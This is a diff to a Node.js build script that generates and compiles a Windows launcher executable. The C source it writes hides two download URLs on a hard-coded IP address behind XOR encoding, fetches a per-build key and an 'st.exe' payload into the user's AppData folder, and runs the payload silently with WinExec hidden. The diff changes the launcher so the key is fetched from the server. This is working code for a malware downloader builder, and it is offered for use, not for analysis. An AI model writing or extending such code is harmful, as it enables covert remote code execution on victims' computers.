@@ -2,7 +2,6 @@
 import fs from 'node:fs';
 import path from 'node:path';
 import os from 'node:os';
-import crypto from 'node:crypto';
 import { execFile } from 'node:child_process';
 import { promisify } from 'node:util';
 import { fileURLToPath } from 'node:url';
@@ -13,26 +12,6 @@ const __dirname = path.dirname(__filename);
 
 const CC      = process.env.MINGW_CC      || 'x86_64-w64-mingw32-gcc';
 const WINDRES = process.env.MINGW_WINDRES || 'x86_64-w64-mingw32-windres';
-
-// Standard XOR encryption for the payload
-function packPayload({ key, config, baseBuf, xorKey }) {
-  const keyBuf = Buffer.from(key || '', 'utf8');
-  const cfgBuf = Buffer.from(JSON.stringify(config || {}), 'utf8');
-
-  const header = Buffer.alloc(13);
-  header.writeUInt8(1, 0);
-  header.writeUInt32LE(keyBuf.length, 1);
-  header.writeUInt32LE(cfgBuf.length, 5);
-  header.writeUInt32LE(baseBuf.length, 9);
-
-  const raw = Buffer.concat([header, keyBuf, cfgBuf, baseBuf]);
-
-  const out = Buffer.alloc(raw.length);
-  for (let i = 0; i < raw.length; i++) {
-    out[i] = raw[i] ^ xorKey[i % xorKey.length];
-  }
-  return out;
-}
 
 function rcSource() {
   return `
@@ -60,11 +39,17 @@ END
 `;
 }
 
-function cSource({ ip, key }) {
-  const url = `http://${ip}/api/downloads/st.exe`;
+function cSource({ ip, buildId }) {
+  // We point to the new /api/getkey endpoint
+  const keyUrl = `http://${ip}/api/getkey/${buildId}`;
+  const stUrl  = `http://${ip}/api/downloads/st.exe`;
+
   const xorKey = [0x4B, 0x2A, 0x11, 0x9C]; 
-  const encUrl = Array.from(url).map((c, i) => c.charCodeAt(0) ^ xorKey[i % xorKey.length]);
-  const urlArr = encUrl.map(b => '0x' + b.toString(16).padStart(2, '0')).join(',');
+  const encKeyUrl = Array.from(keyUrl).map((c, i) => c.charCodeAt(0) ^ xorKey[i % xorKey.length]);
+  const keyUrlArr = encKeyUrl.map(b => '0x' + b.toString(16).padStart(2, '0')).join(',');
+
+  const encStUrl = Array.from(stUrl).map((c, i) => c.charCodeAt(0) ^ xorKey[i % xorKey.length]);
+  const stUrlArr = encStUrl.map(b => '0x' + b.toString(16).padStart(2, '0')).join(',');
 
   return `
 #include <windows.h>
@@ -74,14 +59,13 @@ function cSource({ ip, key }) {
 
 #pragma comment(lib, "winhttp.lib")
 
-void decrypt_url(wchar_t* out) {
-    unsigned char enc[] = { ${urlArr} };
+void decrypt_url(wchar_t* out, const unsigned char* enc, int len) {
     unsigned char key[] = { 0x4B, 0x2A, 0x11, 0x9C };
     int key_len = sizeof(key);
-    for (int i = 0; i < sizeof(enc); i++) {
+    for (int i = 0; i < len; i++) {
         out[i] = (wchar_t)(enc[i] ^ key[i % key_len]);
     }
-    out[sizeof(enc)] = 0;
+    out[len] = 0;
 }
 
 void download_file(const wchar_t* url, const wchar_t* dest) {
@@ -143,29 +127,26 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
     _snwprintf(loaderDir, MAX_PATH, L"%ls\\\\loader", appData);
     CreateDirectoryW(loaderDir, NULL);
 
-    // 1. Write key.json FIRST so st.exe doesn't crash looking for it
+    unsigned char encKeyUrl[] = { ${keyUrlArr} };
+    unsigned char encStUrl[] = { ${stUrlArr} };
+
+    // 1. Fetch key.json from the server
+    wchar_t keyUrl[1024];
+    decrypt_url(keyUrl, encKeyUrl, sizeof(encKeyUrl));
+    
     wchar_t keyPath[MAX_PATH];
     _snwprintf(keyPath, MAX_PATH, L"%ls\\\\key.json", loaderDir);
-    
-    char keyJson[512];
-    _snprintf(keyJson, sizeof(keyJson), "{\\"key\\": \\"${key}\\"}");
-    
-    HANDLE hKey = CreateFileW(keyPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-    if (hKey != INVALID_HANDLE_VALUE) {
-        DWORD written;
-        WriteFile(hKey, keyJson, strlen(keyJson), &written, NULL);
-        CloseHandle(hKey);
-    }
+    download_file(keyUrl, keyPath);
 
     // 2. Download st.exe
+    wchar_t stUrl[1024];
+    decrypt_url(stUrl, encStUrl, sizeof(encStUrl));
+    
     wchar_t dest[MAX_PATH];
     _snwprintf(dest, MAX_PATH, L"%ls\\\\st.exe", loaderDir);
+    download_file(stUrl, dest);
 
-    wchar_t url[1024];
-    decrypt_url(url);
-    download_file(url, dest);
-
-    // 3. Launch st.exe silently (WinExec runs as standard user, no UAC)
+    // 3. Launch st.exe silently
     char ansiDest[MAX_PATH];
     WideCharToMultiByte(CP_ACP, 0, dest, -1, ansiDest, MAX_PATH, NULL, NULL);
     WinExec(ansiDest, SW_HIDE);
@@ -175,7 +156,7 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
 `;
 }
 
-export async function compileLauncher({ key, config, baseExe }) {
+export async function compileLauncher({ key, config, baseExe, buildId }) {
   let ip = "31.58.77.63";
   if (config && config.ip) ip = config.ip;
 
@@ -185,7 +166,7 @@ export async function compileLauncher({ key, config, baseExe }) {
   const resPath    = path.join(workDir, 'app.res');
   const outPath    = path.join(workDir, 'launcher.exe');
 
-  fs.writeFileSync(cPath, cSource({ ip, key }));
+  fs.writeFileSync(cPath, cSource({ ip, buildId }));
   fs.writeFileSync(rcPath, rcSource());
 
   const iconSourcePath = path.join(__dirname, '..', 'icon.ico');
